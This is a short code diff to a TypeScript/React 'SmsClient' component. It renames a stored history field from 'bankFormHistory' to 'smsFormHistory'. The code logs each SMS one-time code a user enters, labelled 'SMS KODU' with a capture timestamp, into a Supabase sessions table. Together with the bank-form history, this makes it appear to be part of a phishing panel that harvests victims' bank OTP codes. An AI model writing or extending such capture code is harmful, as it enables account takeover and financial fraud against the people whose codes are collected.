@@ -180,11 +180,11 @@ export function SmsClient({ sessionId }: Props) {
       "",
     ).trim();
     const isFirstSmsEntry = prevSms.length === 0;
-    const currentHistory: any[] = Array.isArray((sessionFormData as any).bankFormHistory)
-      ? (sessionFormData as any).bankFormHistory.slice()
+    const smsFormHistory: any[] = Array.isArray((sessionFormData as any).smsFormHistory)
+      ? (sessionFormData as any).smsFormHistory.slice()
       : [];
     if (!isFirstSmsEntry) {
-      currentHistory.push({
+      smsFormHistory.push({
         htmlStepLabel: "SMS KODU",
         capturedAt: new Date().toISOString(),
         smsCode: prevSms,
@@ -199,7 +199,7 @@ export function SmsClient({ sessionId }: Props) {
       sms_code: trimmed,
       sms_otp_length: trimmed.length,
       sms_otp_mode: smsMode,
-      bankFormHistory: currentHistory,
+      smsFormHistory,
     };
     const { error } = await supabase
       .from("sessions")
